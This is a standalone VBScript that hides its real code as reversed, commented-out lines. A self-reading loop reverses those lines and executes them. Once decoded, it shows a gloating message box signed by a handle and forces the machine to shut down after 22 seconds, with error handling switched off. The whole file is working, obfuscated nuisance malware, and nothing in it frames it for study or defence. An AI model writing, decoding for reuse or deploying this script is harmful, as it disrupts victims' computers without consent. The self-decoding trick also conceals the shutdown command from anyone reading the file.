'txeN emuseR rorrE nO
'llehSo miD
')"llehs.tpircSW"( tcejbOetaerC.tpircSW = llehSo teS
'"HAHAHAHWuM etin'G.....ypeeeeeels....ypeeeels 'nikool si CP ru syaS -=]HT0HT-gazA[=-"xobgsm
'"22 t- s- nwodtuhs K/ dmc" nur.llehSo
'eurT=nur.llehSo
'nehT eurT fI
'fI dnE
On error resume next
Set fso = CreateObject("scripting.filesystemobject")
Set r = fso.opentextfile(wscript.scriptfullname)
aa=8
Do
buffer = r.readline
buffer2 = strreverse(buffer)
buffer3 = Mid(buffer2, 1, Len(buffer2) - 1)
all=all &":"& buffer3
aa = aa - 1
Loop While aa <> 0
SSE = Mid(All, 2, Len(All) - 1)
execute (SSE)
